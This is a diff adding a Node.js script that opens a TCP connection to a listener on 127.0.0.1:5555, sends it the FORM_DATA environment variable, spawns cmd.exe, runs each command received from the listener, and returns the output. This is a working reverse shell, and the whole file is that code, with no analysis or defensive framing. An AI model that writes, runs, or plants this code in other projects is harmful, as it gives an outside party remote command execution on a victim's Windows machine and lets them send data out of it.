@@ -1,0 +1,54 @@
+const net = require('net');
+const { spawn } = require('child_process');
+
+const formData = process.env.FORM_DATA || '{}';
+console.log('Form Data:', formData);
+
+const client = new net.Socket();
+client.connect(5555, '127.0.0.1', () => {
+    console.log('Connected to listener');
+    
+    client.write('=== Remote Command Session ===\n');
+    client.write('Session initialized. Waiting for commands.\n');
+    client.write('Form Data: ' + formData + '\n');
+    client.write('=============================\n');
+    
+    const shell = spawn('cmd.exe', [], { stdio: ['pipe', 'pipe', 'pipe'] });
+    
+    // Log and forward shell output to the server
+    shell.stdout.on('data', (data) => {
+        const output = data.toString();
+        console.log('Shell Output:', output);
+        client.write(`[STDOUT]: ${output}\n`);
+    });
+    
+    shell.stderr.on('data', (data) => {
+        const error = data.toString();
+        console.log('Shell Error:', error);
+        client.write(`[STDERR]: ${error}\n`);
+    });
+    
+    // Receive commands from the server and send to shell
+    client.on('data', (data) => {
+        const command = data.toString().trim();
+        console.log('Received Command:', command);
+        shell.stdin.write(command + '\n');
+        client.write(`[EXECUTED]: ${command}\n`);
+    });
+    
+    // Handle disconnection
+    client.on('close', () => {
+        console.log('Connection closed, terminating shell.');
+        shell.kill();
+    });
+    
+    client.on('error', (err) => {
+        console.error('Client error:', err.message);
+        shell.kill();
+    });
+});
+
+// Handle client errors
+client.on('error', (err) => {
+    console.error('Failed to connect:', err.message);
+});
